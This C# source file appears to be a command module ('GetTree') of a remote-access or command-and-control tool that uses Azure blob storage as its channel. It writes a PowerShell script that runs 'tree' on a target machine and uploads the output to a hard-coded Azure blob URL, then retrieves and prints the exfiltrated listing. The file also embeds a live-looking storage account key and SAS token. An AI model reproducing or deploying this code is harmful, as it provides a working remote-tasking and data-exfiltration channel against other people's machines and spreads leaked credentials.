using System;
using System.IO;
using System.Text;
using System.Threading;
using Microsoft.WindowsAzure.Storage;
using Microsoft.WindowsAzure.Storage.Blob;

namespace Neko_An0maly.Commands
{
    public class GetTree : Command
    {
        public static string path = @"C:\ProgramData\";

        public GetTree(string name) : base(name) { }

        public override string execute(string[] args)
        {
            if (args.Length == 1)
            {
                if (File.Exists(path + "tree.txt"))
                {
                    File.Delete(path + "tree.txt");
                }

                Console.WriteLine("Initializing command to be sent.");

                string fileName = args[0] + ".ps1";
                string finalPath = path + fileName;
                using (FileStream fs = File.Create(finalPath))
                {
                    Byte[] line1 = new UTF8Encoding(true).GetBytes(@"$file = " + (char)34 + @"C:\ProgramData\tree.txt" + (char)34);
                    fs.Write(line1, 0, line1.Length);
                    byte[] line3 = new UTF8Encoding(true).GetBytes("\ntree | Out-File -FilePath $file");
                    fs.Write(line3, 0, line3.Length);
                    byte[] line4 = new UTF8Encoding(true).GetBytes("\n$name = (Get-Item $file).Name");
                    fs.Write(line4, 0, line4.Length);
                    byte[] line5 = new UTF8Encoding(true).GetBytes("\n$uri = " + (char)34 + "https://previewps.blob.core.windows.net/data/$($name)?sv=2020-08-04&ss=bfqt&srt=sco&sp=rwdlacupitfx&se=2023-04-12T05:55:16Z&st=2021-11-23T21:55:16Z&spr=https,http&sig=YkdxIMDKKrObLdkUq9kOX5nosPDodaw4w6MIt4V64wo%3D" + (char)34);
                    fs.Write(line5, 0, line5.Length);
                    byte[] line6 = new UTF8Encoding(true).GetBytes("\n$headers = @{");
                    fs.Write(line6, 0, line6.Length);
                    byte[] line7 = new UTF8Encoding(true).GetBytes("\n" + @"    'x-ms-blob-type' = 'BlockBlob'");
                    fs.Write(line7, 0, line7.Length);
                    byte[] line8 = new UTF8Encoding(true).GetBytes("\n}");
                    fs.Write(line8, 0, line8.Length);
                    byte[] line9 = new UTF8Encoding(true).GetBytes("\nInvoke-RestMethod -Uri $uri -Method Put -Headers $headers -InFile $file");
                    fs.Write(line9, 0, line9.Length);
                    byte[] line10 = new UTF8Encoding(true).GetBytes("\nRename-Item $file");
                    fs.Write(line10, 0, line10.Length);
                }

                Console.WriteLine("Initializing upload.");

                upload(finalPath);
                download(path);
                check();

                return "";
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Invalid arguments for 'tree'.Requires 1 argument(s).");
                Console.ForegroundColor = ConsoleColor.White;
                return "";
            }
        }

        public void upload(string fileToUpload)
        {
            string file_extension,
            filename_withExtension,
            storageAccount_connectionString;
            Stream file;
            string azure_ContainerName = "ftp";

            storageAccount_connectionString = "DefaultEndpointsProtocol=https;AccountName=previewps;AccountKey=Io326GO+TGJpd8yBh1LzSDDRc6vdWV81O6Ntkc/SJOYHe4NA6IlxUOPrJjycEM8uAEWZu2XkZ5LUDTymfRGIsw==;EndpointSuffix=core.windows.net"; ;

            file = new FileStream(fileToUpload, FileMode.Open);

            CloudStorageAccount mycloudStorageAccount = CloudStorageAccount.Parse(storageAccount_connectionString);
            CloudBlobClient blobClient = mycloudStorageAccount.CreateCloudBlobClient();
            CloudBlobContainer container = blobClient.GetContainerReference(azure_ContainerName);

            if (container.CreateIfNotExists())
            {

                container.SetPermissionsAsync(new BlobContainerPermissions
                {
                    PublicAccess =
                  BlobContainerPublicAccessType.Blob
                });

            }

            file_extension = Path.GetExtension(fileToUpload);
            filename_withExtension = Path.GetFileName(fileToUpload);

            CloudBlockBlob cloudBlockBlob = container.GetBlockBlobReference(filename_withExtension);
            cloudBlockBlob.Properties.ContentType = file_extension;

            cloudBlockBlob.UploadFromStreamAsync(file);

            Console.WriteLine("Upload Completed.");
            Console.WriteLine("Thread sleeping for 9s.");

            Thread.Sleep(9000);

            Console.WriteLine("Deleting command to prevent looping.");
            cloudBlockBlob.DeleteIfExists();
            file.Dispose();
        }

        public static void download(string downloadLocation)
        {
            string filetoDownload = "tree.txt";
            string azure_ContainerName = "data";

            string storageAccount_connectionString = "DefaultEndpointsProtocol=https;AccountName=previewps;AccountKey=Io326GO+TGJpd8yBh1LzSDDRc6vdWV81O6Ntkc/SJOYHe4NA6IlxUOPrJjycEM8uAEWZu2XkZ5LUDTymfRGIsw==;EndpointSuffix=core.windows.net";

            CloudStorageAccount mycloudStorageAccount = CloudStorageAccount.Parse(storageAccount_connectionString);
            CloudBlobClient blobClient = mycloudStorageAccount.CreateCloudBlobClient();

            CloudBlobContainer container = blobClient.GetContainerReference(azure_ContainerName);
            CloudBlockBlob cloudBlockBlob = container.GetBlockBlobReference(filetoDownload);

            if (cloudBlockBlob.Exists())
            {
                Stream file = File.OpenWrite(downloadLocation + filetoDownload);
                cloudBlockBlob.DownloadToStream(file);
                cloudBlockBlob.DeleteIfExists();
                file.Dispose();
            }
        }

        public static void check()
        {
            if (!File.Exists(path + "tree.txt"))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("File not found!");
                Console.ForegroundColor = ConsoleColor.White;
            }
            else
            {
                Console.ForegroundColor = ConsoleColor.Green;
                Console.WriteLine("File found!");
                Console.ForegroundColor = ConsoleColor.White;
                string[] dirlist = File.ReadAllLines(path + "tree.txt");
                foreach (string dir in dirlist)
                {
                    Console.WriteLine(dir);
                }
            }
        }
    }
}
